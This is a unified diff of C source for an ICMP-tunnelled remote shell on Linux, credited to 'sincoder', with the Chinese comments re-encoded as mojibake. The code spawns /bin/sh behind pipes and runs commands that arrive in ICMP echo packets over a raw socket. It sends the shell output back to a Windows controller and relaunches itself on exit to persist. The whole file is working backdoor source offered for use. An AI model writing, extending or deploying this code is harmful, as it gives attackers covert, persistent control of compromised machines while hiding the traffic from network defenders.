@@ -1,25 +1,30 @@
 /*
-ÔËĞĞÔÚ Linux ÉÏµÄ·şÎñ¶Ë
+è¿è¡Œåœ¨ Linux ä¸Šçš„æœåŠ¡ç«¯
 
-À´Ò»¸ö
+æ¥ä¸€ä¸ª
 
-icmp µÄÒ»¸ö replay °ü ºÍ Ò»¸ö request °üÒª¶ÔÓ¦...
+icmp çš„ä¸€ä¸ª replay åŒ… å’Œ ä¸€ä¸ª request åŒ…è¦å¯¹åº”...
 
-±»¿ØÖÆµÄ linux Òª·¢ËÍ echo  request °ü 
-È»ºó windows Õâ±ßĞèÒª¹Ø±Õ±¾»úµÄ icmp echo µÄ¹¦ÄÜ ²»ÏìÓ¦ request ÇëÇó  È»ºóÎÒÃÇµÄ³ÌĞòÀ´·¢ËÍ echo ÇëÇó 
+è¢«æ§åˆ¶çš„ linux è¦å‘é€ echo  request åŒ…
+ç„¶å windows è¿™è¾¹éœ€è¦å…³é—­æœ¬æœºçš„ icmp echo çš„åŠŸèƒ½ ä¸å“åº” request è¯·æ±‚  ç„¶åæˆ‘ä»¬çš„ç¨‹åºæ¥å‘é€ echo è¯·æ±‚
 
-linux ĞèÒªÏÈ·¢Ò»¸ö°ü ¹ıÀ´ ¿ªÊ¼ shell --> ½â¾ö·½°¸¾ÍÊÇ ²»¶ÏµÄ¼àÌı ¼àÌıµ½Ò»¸ö icmp request ¾ÍÏòÄÇ¸ö ip ·¢ËÍ icmp request ¿ªÊ¼ shell
-È»ºó windows µÄ¿ØÖÆ¶Ë 
+linux éœ€è¦å…ˆå‘ä¸€ä¸ªåŒ… è¿‡æ¥ å¼€å§‹ shell --> è§£å†³æ–¹æ¡ˆå°±æ˜¯ ä¸æ–­çš„ç›‘å¬ ç›‘å¬åˆ°ä¸€ä¸ª icmp request å°±å‘é‚£ä¸ª ip å‘é€ icmp request å¼€å§‹ shell
+ç„¶å windows çš„æ§åˆ¶ç«¯
 
-Linux ÉÏÃæÆô¶¯Ò»¸ö¶¨Ê±Æ÷ 1s ·¢ËÍÒ»¸ö request ÇëÇó ¿´¿´ÊÇ²»ÊÇÓĞÊı¾İÁË 
+Linux ä¸Šé¢å¯åŠ¨ä¸€ä¸ªå®šæ—¶å™¨ 1s å‘é€ä¸€ä¸ª request è¯·æ±‚ çœ‹çœ‹æ˜¯ä¸æ˜¯æœ‰æ•°æ®äº†
 
-linux ·¢ËÍÊı¾İ¸ø windows Ö»ÄÜÍ¨¹ı request °ü 
-windows ·¢ËÍÊı¾İ¸ø Linux Ö»ÄÜÍ¨¹ı reply °ü     ÒòÎªÎÒÃÇ²»ÄÜ¸ø¶Ô·½·¢ËÍ request °ü
+linux å‘é€æ•°æ®ç»™ windows åªèƒ½é€šè¿‡ request åŒ…
+windows å‘é€æ•°æ®ç»™ Linux åªèƒ½é€šè¿‡ reply åŒ…     å› ä¸ºæˆ‘ä»¬ä¸èƒ½ç»™å¯¹æ–¹å‘é€ request åŒ…
 
 linux --zip--> windows
- |               |
- |               |
- +--zip--0x842B--+
+|               |
+|               |
++--zip--0x842B--+
+
+2013.4.27 
+todo:
+    spilt lage data into mutil packet 
+    when sh exit  restart shell 
 */
 #include <stdio.h>
 #include <stdlib.h>
@@ -40,86 +45,100 @@ linux --zip--> windows
 #include <errno.h>
 #include <sys/wait.h>
 #include <sys/time.h>
-
+#include <time.h>
 
 typedef unsigned int uint32;
 typedef unsigned short uint16;
 typedef unsigned char uint8;
 
-
 #define dbg_msg(fmt,...) do{\
-    printf(fmt,__VA_ARGS__); \
-}while(0);
+        printf(fmt,__VA_ARGS__); \
+    }while(0);
 
-#define IN_BUF_SIZE   1024  //½ÓÊÕÊı¾İµÄ»º³åÇøµÄ´óĞ¡ 
-#define OUT_BUF_SIZE  64
-#define SLEEP_TIME 1000
+//#define IN_BUF_SIZE   1024  //æ¥æ”¶æ•°æ®çš„ç¼“å†²åŒºçš„å¤§å° 
+#define MAX_BUFF_SIZE  1000 // max data size can send 
+#define SLEEP_TIME 1000 // interval of send echo request packet 
+
+
+enum PACKET_TYPE
+{
+    TYPE_REQUEST = 0x2B,
+    TYPE_REPLY 
+};
+
+
+struct packet_header
+{
+    uint8 type;
+};
 
 int  g_icmp_sock = 0;
-int  g_CanThreadExit = 0; //Ïß³ÌÊÇ²»ÊÇ¿ÉÒÔÍË³öÁË¡£
-int  read_pipe[2];  //¶ÁÈ¡µÄ¹ÜµÀ
+int  g_CanThreadExit = 0; //çº¿ç¨‹æ˜¯ä¸æ˜¯å¯ä»¥é€€å‡ºäº†ã€‚
+int  read_pipe[2];  //è¯»å–çš„ç®¡é“
 int  write_pipe[2];
 char *g_MyName = NULL;
-uint32 g_RemoteIp = 0;// Ô¶³Ì ip 
-char *g_Cmd = NULL; //ÒªÖ´ĞĞµÄÃüÁî
-char *g_Request = NULL;//ÇëÇóµÄÊı¾İ°É
-char *g_password = "sincoder"; //Í¨ĞÅµÄÃÜÂë
-char *g_hello_msg = "Icmp Shell V1.0 \nBy: sincoder \n";
-
+uint32 g_RemoteIp = 0;// è¿œç¨‹ ip
+char *g_Cmd = NULL; //è¦æ‰§è¡Œçš„å‘½ä»¤
+char *g_Request = NULL;//è¯·æ±‚çš„æ•°æ®å§
+char *g_password = "sincoder"; //é€šä¿¡çš„å¯†ç 
+char *g_hello_msg = "\x2BIcmp Shell V1.0 \nBy: sincoder \n";
+uint32 g_bind_ip = 0;
+char g_output_buffer[MAX_BUFF_SIZE] = {0};  //ç¼“å­˜è¦å‘é€çš„æ•°æ®
+pthread_mutex_t g_output_mutex;
 
 void MySleep(uint32 msec)
 {
     struct timespec slptm;
     slptm.tv_sec = msec / 1000;
     slptm.tv_nsec = 1000 * 1000 * (msec - (msec / 1000) * 1000);      //1000 ns = 1 us
-    if(nanosleep(&slptm,NULL) != -1)
+    if (nanosleep(&slptm, NULL) != -1)
     {
 
     }
     else
     {
-        dbg_msg("%s : %u","nanosleep failed !!\n",msec);
+        dbg_msg("%s : %u", "nanosleep failed !!\n", msec);
     }
 }
 
 /*
- from tcpdump  not thread safe
+from tcpdump  not thread safe
 */
 #define IPTOSBUFFERS    12
 
 char *iptos(uint32 in)
 {
-    static char output[IPTOSBUFFERS][3*4+3+1];
+    static char output[IPTOSBUFFERS][3 * 4 + 3 + 1];
     static short which;
     unsigned char *p;
 
     p = (unsigned char *)&in;
     which = (which + 1 == IPTOSBUFFERS ? 0 : which + 1);
-    snprintf(output[which], sizeof(output[which]),"%d.%d.%d.%d", p[0], p[1], p[2], p[3]);
+    snprintf(output[which], sizeof(output[which]), "%d.%d.%d.%d", p[0], p[1], p[2], p[3]);
     return output[which];
 }
 
 /*
-´´½¨Ò»¸öÏß³Ì 
+åˆ›å»ºä¸€ä¸ªçº¿ç¨‹
 */
-pthread_t MyCreateThread(void *(*func)(void *),void *lparam)
+pthread_t MyCreateThread(void * (*func)(void *), void *lparam)
 {
     pthread_attr_t attr;
     pthread_t  p;
     pthread_attr_init(&attr);
     //pthread_attr_setdetachstate(&attr,PTHREAD_CREATE_DETACHED);
-    if(0 == pthread_create(&p,&attr,func,lparam))
+    if (0 == pthread_create(&p, &attr, func, lparam))
     {
         pthread_attr_destroy(&attr);
         return p;
     }
-    dbg_msg("pthread_create() error: %s \n",strerror(errno));
+    dbg_msg("pthread_create() error: %s \n", strerror(errno));
     pthread_attr_destroy(&attr);
     return 0;
 }
 
 /*
-¼ÆËã icmp Êı¾İ°üµÄ Ğ£ÑéºÍ
+è®¡ç®— icmp æ•°æ®åŒ…çš„ æ ¡éªŒå’Œ
 */
 unsigned short checksum(unsigned short *ptr, int nbytes)
 {
@@ -127,16 +146,16 @@ unsigned short checksum(unsigned short *ptr, int nbytes)
     unsigned short oddbyte, rs;
 
     sum = 0;
-    while(nbytes > 1) 
+    while (nbytes > 1)
     {
         sum += *ptr++;
         nbytes -= 2;
     }
 
-    if(nbytes == 1) 
+    if (nbytes == 1)
     {
         oddbyte = 0;
-        *((unsigned char *) &oddbyte) = *(unsigned char  *)ptr;
+        *((unsigned char *) &oddbyte) = *(unsigned char *)ptr;
         sum += oddbyte;
     }
 
@@ -149,24 +168,26 @@ unsigned short checksum(unsigned short *ptr, int nbytes)
 uint16  random16()
 {
     struct timeval tv;
-    gettimeofday(&tv,NULL);
+    gettimeofday(&tv, NULL);
     return (uint16)tv.tv_sec * tv.tv_usec;
 }
 
 /*
-·¢ËÍ icmp  echo request °ü
-Ê§°Ü·µ»Ø -1
-³É¹¦·µ»Ø 0
+å‘é€ icmp  echo request åŒ…
+å¤±è´¥è¿”å› -1
+æˆåŠŸè¿”å› 0
 */
-int  icmp_sendrequest(int icmp_sock, uint32 ip,uint8 *pdata,uint32 size)
+int  icmp_sendrequest(int icmp_sock, uint32 ip, uint8 *pdata, uint32 size)
 {
     struct icmphdr *icmp;
     struct sockaddr_in addr;
     int nbytes;
     int ret = 1;
 
+    dbg_msg("%s: try send request to %s \n", __func__, iptos(ip));
+
     icmp = (struct icmphdr *)malloc(sizeof(struct icmphdr) + size);
-    if(NULL == icmp)
+    if (NULL == icmp)
     {
         return -1;
     }
@@ -175,17 +196,17 @@ int  icmp_sendrequest(int icmp_sock, uint32 ip,uint8 *pdata,uint32 size)
     icmp->un.echo.id = random16();
     icmp->un.echo.sequence = random16();
 
-    memcpy(icmp + 1,pdata,size);
-    memset(&addr,0,sizeof(struct sockaddr_in));
+    memcpy(icmp + 1, pdata, size);
+    memset(&addr, 0, sizeof(struct sockaddr_in));
     addr.sin_family = AF_INET;
     addr.sin_addr.s_addr = ip;
-    
-    icmp->checksum = 0x00; // echo replay 
+
+    icmp->checksum = 0x00; // echo replay
     icmp->checksum = checksum((unsigned short *) icmp, sizeof(struct icmphdr) + size);
 
     // send reply
     nbytes = sendto(g_icmp_sock, icmp, sizeof(struct icmphdr) + size, 0, (struct sockaddr *) &addr, sizeof(addr));
-    if (nbytes == -1) 
+    if (nbytes == -1)
     {
         perror("sendto");
         ret = -1;
@@ -195,11 +216,11 @@ int  icmp_sendrequest(int icmp_sock, uint32 ip,uint8 *pdata,uint32 size)
 }
 
 /*
-·¢ËÍ Êı¾İ ¶Ô Êı¾İ½øĞĞ Ñ¹Ëõ
+å‘é€ æ•°æ® å¯¹ æ•°æ®è¿›è¡Œ å‹ç¼©
 */
-int SendData(unsigned char *pData,int Size)
+int SendData(unsigned char *pData, int Size)
 {
-    return icmp_sendrequest(g_icmp_sock,g_RemoteIp,pData,Size);
+    return icmp_sendrequest(g_icmp_sock, g_RemoteIp, pData, Size);
 }
 
 void set_fd_noblock(int fd)
@@ -211,94 +232,139 @@ void set_fd_noblock(int fd)
 }
 
 /*
-½ÓÊÕÃüÁîµÄÏß³Ì
+æ¥æ”¶å‘½ä»¤çš„çº¿ç¨‹
 */
 void *Icmp_RecvThread(void *lparam)
 {
-    char in_buf[IN_BUF_SIZE];
+    char in_buf[8192];
     struct iphdr *ip;
     struct icmphdr *icmp;
-    char *data;
     int nbytes = 0;
 
-    dbg_msg("%s:Icmp_RecvThread  start !! \n",__func__);
+    dbg_msg("%s:Icmp_RecvThread  start !! \n", __func__);
 
-    while(1) 
+    while (1)
     {
         // read data from socket
-        memset(in_buf, 0x00, IN_BUF_SIZE);
-        nbytes = read(g_icmp_sock, in_buf, IN_BUF_SIZE - 1);
-        if (nbytes > 0) 
+        memset(in_buf, 0x00, 8192);
+        nbytes = read(g_icmp_sock, in_buf, 8192 - 1);
+        if (nbytes > 0)
         {
             // get ip and icmp header and data part
             ip = (struct iphdr *) in_buf;
-            if (nbytes > sizeof(struct iphdr))
+            if (nbytes > sizeof(struct iphdr) && ip->saddr !=  inet_addr("127.0.0.1"))  //è¿‡æ»¤æ‰æœ¬åœ° ip çš„
             {
                 int iplen = ip->ihl * sizeof(unsigned int);
-                nbytes -= sizeof(struct iphdr);
+                nbytes -= iplen;
                 icmp = (struct icmphdr *) ((char *)ip + iplen);
-                if(0 == icmp->type)  //Ö»½ÓÊÜ icmp request ÇëÇóµÄ
+
+                if (nbytes > sizeof(struct icmphdr))
                 {
-                    if (nbytes > sizeof(struct icmphdr))
+                    if (0 == icmp->code) //  icmp echo msg
                     {
-                        nbytes -= sizeof(struct icmphdr);
-                        if(nbytes > 2)
+                        dbg_msg("%s recv a icmp echo msg !! \n", __func__);
+                        if (0 == icmp->type) //replay
                         {
-                            data = (char *) (icmp + 1);  //µÃµ½ icmp Í· ºóÃæµÄÊı¾İ 
-                            if(0x842B == *(uint16 *)data)  //ÑéÖ¤ÏÂÊÇ²»ÊÇÎÒÃÇµÄ¿Í»§¶Ë·¢µÄ
+                            struct packet_header *phdr = (struct packet_header *)(icmp + 1);
+                            nbytes -= sizeof(struct icmphdr);
+                            nbytes -= sizeof(struct packet_header);
+                            //data = (char *) (icmp + 1);  //å¾—åˆ° icmp å¤´ åé¢çš„æ•°æ®
+                            switch (phdr->type)
                             {
-                                data += 2;
-                                nbytes -= 2;
-                                data[nbytes] = '\0';
-                                dbg_msg("%s:icmp recv %s  \n",__func__, data);
-                                // Ğ´µ½ shell ÀïÃæ 
-                                data[nbytes] = '\n';  //·¢À´µÄÃüÁî ÀïÃæ Ó¦¸Ã ²»ÄÜº¬ÓĞ \n
-                                write(write_pipe[1],data,nbytes+1);
-                                fflush(stdout);
+                            case TYPE_REPLY:  // we only handle this msg
+                            {
+                                char request_buff[sizeof(struct packet_header) + sizeof(g_output_buffer)];
+                                char *data = (char *)(phdr + 1);
 
-                                //ÎÒÃÇÒ²ÒªÂíÉÏ ·¢»ØÒ»¸ö request À´¿´¿´ ÓĞÄ¾ÓĞÊı¾İÁË ´ËÊ±ÒªÑÓÊ±µÄ 
+                                dbg_msg("%s: msg type reply !! \n", __func__);
+                                dbg_msg("%s : recv %d bytes : %s \n",__func__,nbytes,data);
+                                if (nbytes > 1)
+                                {
+                                    int len = 0;
+                                    data[nbytes] = '\0';
+                                    //dbg_msg("%s:icmp recv %s  \n", __func__, data);
+                                    // å†™åˆ° shell é‡Œé¢
+                                    len = strlen(data);
+                                    data[len] = '\n';  //å‘æ¥çš„å‘½ä»¤ é‡Œé¢ åº”è¯¥ ä¸èƒ½å«æœ‰ \n
+                                    write(write_pipe[1], data, len + 1);
+                                    //fflush(stdout);
+                                }
+                                //æˆ‘ä»¬ä¹Ÿè¦é©¬ä¸Š å‘å›ä¸€ä¸ª request æ¥çœ‹çœ‹ æœ‰æœ¨æœ‰æ•°æ®äº† æ­¤æ—¶è¦å»¶æ—¶çš„
                                 MySleep(SLEEP_TIME);
+                                pthread_mutex_lock(&g_output_mutex);
+                                ((struct packet_header *)request_buff)->type = TYPE_REQUEST;
+                                strcpy((char *)((char *)request_buff + sizeof(struct packet_header)),g_output_buffer);
+                                icmp_sendrequest(g_icmp_sock, ip->saddr, &request_buff[0], strlen(g_output_buffer) + sizeof(struct packet_header));
+                                g_output_buffer[0] = 0;
+                                pthread_mutex_unlock(&g_output_mutex);
+                            }
+                            break;
+                            case TYPE_REQUEST:
+                            {
+                                dbg_msg("%s:msg type request  error packet !!!!\n", __func__);
+                            }
+                            break;
+                            default:
+                            {
+                                dbg_msg("%s : unknown msg !!! something may goes wrong \n", __func__);
+                            }
+                            break;
+                            }
 
-                                icmp_sendrequest(g_icmp_sock,ip->saddr,NULL,0);
+                        }
+
+                        else if (8 == icmp->type)
+                        {
+                            char *data = (char *)(icmp + 1);
+                            if(TYPE_REQUEST == data[0])
+                            {
+                                dbg_msg("%s: recv a icmp request from %s \n", __func__, iptos(ip->saddr));
+                                
+                                icmp_sendrequest(g_icmp_sock, ip->saddr, (uint8 *)g_hello_msg, strlen(g_hello_msg)); //
                             }
                         }
                     }
                 }
-                else if(8 == icmp->type)
-                {
-                    //icmp request 
-                    //´ËÊ± ·¢ËÍ hello msg
-                    dbg_msg("%s: recv a icmp request from %s \n",__func__,iptos(ip->saddr));
-                    icmp_sendrequest(g_icmp_sock,ip->saddr,(uint8 *)g_hello_msg,strlen(g_hello_msg)); //
-                }
             }
         }
-        if(-1 == nbytes)
+        if (-1 == nbytes)
         {
-            dbg_msg("%s:read() error \n",__func__);
+            dbg_msg("%s:read() error \n", __func__);
             perror("read() :");
             break;
         }
     }
-    dbg_msg("%s: Thread exit ... \n",__func__);
+    dbg_msg("%s: Thread exit ... \n", __func__);
     return NULL;
 }
 
 /*
-´Ó¹ÜµÀÖĞ¶ÁÈ¡Êı¾İ£¨ÃüÁîÖ´ĞĞµÄ½á¹û£©²¢·¢ËÍ³öÈ¥ 
+ä»ç®¡é“ä¸­è¯»å–æ•°æ®ï¼ˆå‘½ä»¤æ‰§è¡Œçš„ç»“æœï¼‰å¹¶å‘é€å‡ºå»
 */
 void *ShellPipe_ReadThread(void *lparam)
 {
-    unsigned char buff[512];
+    unsigned char buff[1024];
     int nBytes = 0;
 
-    dbg_msg("%s:ShellPipe_ReadThread  start ...\n",__func__);
-    while((nBytes = read(read_pipe[0],&buff[0],510)) > 0)
+    dbg_msg("%s:ShellPipe_ReadThread  start ...\n", __func__);
+    while ((nBytes = read(read_pipe[0], &buff[0], 1000)) > 0)
     {
-        dbg_msg("%s: recv %d bytes from pipe: %s \n",__func__,nBytes,buff);
-        SendData(buff,nBytes);
+        buff[nBytes] = 0;
+        dbg_msg("%s: recv %d bytes from pipe: %s \n", __func__, nBytes, buff);
+        //SendData(buff,nBytes);
+        //æŠŠè¯»åˆ°çš„æ•°æ®æ”¾åˆ°å…¨å±€çš„ç¼“å†²åŒºä¸­
+        pthread_mutex_lock(&g_output_mutex);
+        if (nBytes + strlen(g_output_buffer) <= MAX_BUFF_SIZE)
+        {
+            strcat(&g_output_buffer[0], buff);
+        }
+        else
+        {
+            dbg_msg("%s:out buffer size too small \n", __func__);
+        }
+        pthread_mutex_unlock(&g_output_mutex);
     }
-    dbg_msg("%s: thread exit ... \n",__func__);
+    dbg_msg("%s: thread exit ... \n", __func__);
     return NULL;
 }
 
@@ -309,49 +375,83 @@ void *ShellPipe_ReadThread(void *lparam)
 //         icmp_sendrequest(g_icmp_sock,)
 //     }
 // }
- 
+
 
 /*
-ÍË³öµÄÊ±ºòÖØĞÂÆô¶¯½ø³Ì
+é€€å‡ºçš„æ—¶å€™é‡æ–°å¯åŠ¨è¿›ç¨‹
 */
 void OnExit()
 {
-    dbg_msg("%s:exiting ¡£¡£¡¢\n",__func__);
+    dbg_msg("%s:exiting ã€‚ã€‚ã€\n", __func__);
+    dbg_msg("%s : try restart shell  !! \n",__func__);
     sleep(1);
-    if(g_MyName)
-        system(g_MyName); //ÖØĞÂÆô¶¯½ø³Ì
+    if (g_MyName)
+        system(g_MyName); //é‡æ–°å¯åŠ¨è¿›ç¨‹
+    else
+        dbg_msg("%s:xxxxxx \n",__func__);
 }
+
+uint32_t get_local_ip (uint32_t ip)
+{
+    char buffer[100];
+    int sock = socket ( AF_INET, SOCK_DGRAM, 0);
+    int dns_port = 53;
+    int err;
+    struct sockaddr_in serv;
+    struct sockaddr_in name;
+    socklen_t namelen = sizeof(name);
+    //msg("%s:%s  \n",__func__,inet_ntoa(*(struct in_addr *)&ip));
+    memset( &serv, 0, sizeof(serv));
+    memset( &name, 0, sizeof(name));
+    serv.sin_family = AF_INET;
+    serv.sin_addr.s_addr = ip;//inet_addr(HostName);
+    //memcpy(&serv.sin_addr.s_addr,&ip,4);
+    serv.sin_port = htons( dns_port );
+    err = connect( sock , (const struct sockaddr *) &serv , sizeof(serv) );
+    err = getsockname(sock, (struct sockaddr *) &name, &namelen);
+    //const char *p = inet_ntop(AF_INET, &name.sin_addr, buffer, 100);
+    if (-1 == err)
+    {
+        dbg_msg("%s:%s", __func__, "getsockname failed\n");
+    }
+    close(sock);
+    return name.sin_addr.s_addr;
+}
+
 
 int main(int argc, char **argv)
 {
     int pid;
-    g_MyName = argv[0]; //±£´æÏÂ
+    g_MyName = argv[0]; //ä¿å­˜ä¸‹
     atexit(OnExit);
     // create raw ICMP socket
-    g_icmp_sock = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
-    if (g_icmp_sock == -1) 
+    g_icmp_sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
+    if (g_icmp_sock == -1)
     {
         perror("socket");
         return -1;
     }
+
+    //bind(g_icmp_sock,)
+    //è¦ ä¸ç”¨ Bind ä¸€ä¸ªæœ¬åœ°çš„ip åªæ¥æ”¶æ¥è‡ªè¿œç¨‹çš„ åŒ…
 
     pipe(read_pipe);
     pipe(write_pipe);
 
     pid = fork();
 
-    if(0 == pid)
+    if (0 == pid)
     {
-        //½øÈë×Ó½ø³Ì
-        //Æô¶¯ shell ½ø³Ì
+        //è¿›å…¥å­è¿›ç¨‹
+        //å¯åŠ¨ shell è¿›ç¨‹
         close(read_pipe[0]);
         close(write_pipe[1]);
-        char *argv[] = {"/bin/sh",NULL};
+        char *argv[] = {"/bin/sh", NULL};
         char *shell = "/bin/sh";
-        dup2(write_pipe[0],STDIN_FILENO); //½«ÊäÈëÊä³öÖØ¶¨Ïòµ½¹ÜµÀ
-        dup2(read_pipe[1],STDOUT_FILENO);
-        dup2(read_pipe[1],STDERR_FILENO);
-        execv(shell,argv);  //Æô¶¯ shell 
+        dup2(write_pipe[0], STDIN_FILENO); //å°†è¾“å…¥è¾“å‡ºé‡å®šå‘åˆ°ç®¡é“
+        dup2(read_pipe[1], STDOUT_FILENO);
+        dup2(read_pipe[1], STDERR_FILENO);
+        execv(shell, argv); //å¯åŠ¨ shell
     }
     else
     {
@@ -359,20 +459,22 @@ int main(int argc, char **argv)
         pthread_t hShellRead;
         close(read_pipe[1]);
         close(write_pipe[0]);
-        dbg_msg("child process id %d \n",pid);
-        //Æô¶¯Ò»¸öÏß³ÌÀ´¶ÁÈ¡
-        hIcmpRecv = MyCreateThread(Icmp_RecvThread,NULL);
-        hShellRead = MyCreateThread(ShellPipe_ReadThread,NULL);
-        if(0 == hIcmpRecv || 0 == hShellRead)
+        dbg_msg("child process id %d \n", pid);
+
+        pthread_mutex_init(&g_output_mutex, NULL);
+        //å¯åŠ¨ä¸€ä¸ªçº¿ç¨‹æ¥è¯»å–
+        hIcmpRecv = MyCreateThread(Icmp_RecvThread, NULL);
+        hShellRead = MyCreateThread(ShellPipe_ReadThread, NULL);
+        if (0 == hIcmpRecv || 0 == hShellRead)
         {
-            dbg_msg("%s:Create Thread exit ... \n",__func__);
+            dbg_msg("%s:Create Thread exit ... \n", __func__);
         }
-        waitpid(pid,NULL,0);  //µÈ´ı×Ó½ø³ÌÍË³ö
+        waitpid(pid, NULL, 0); //ç­‰å¾…å­è¿›ç¨‹é€€å‡º
         close(read_pipe[0]);
         close(write_pipe[1]);
-        pthread_join(hIcmpRecv,NULL);  //Ïß³Ì»áÒòÎªÉÏÃæµÄ¾ä±ú¹Ø±Õ ¶øÍË³ö
-        pthread_join(hShellRead,NULL);
-        dbg_msg("%s:child exit. ..\n",__func__);
+        pthread_join(hIcmpRecv, NULL); //çº¿ç¨‹ä¼šå› ä¸ºä¸Šé¢çš„å¥æŸ„å…³é—­ è€Œé€€å‡º
+        pthread_join(hShellRead, NULL);
+        dbg_msg("%s:child exit. ..\n", __func__);
     }
     return 0;
 }
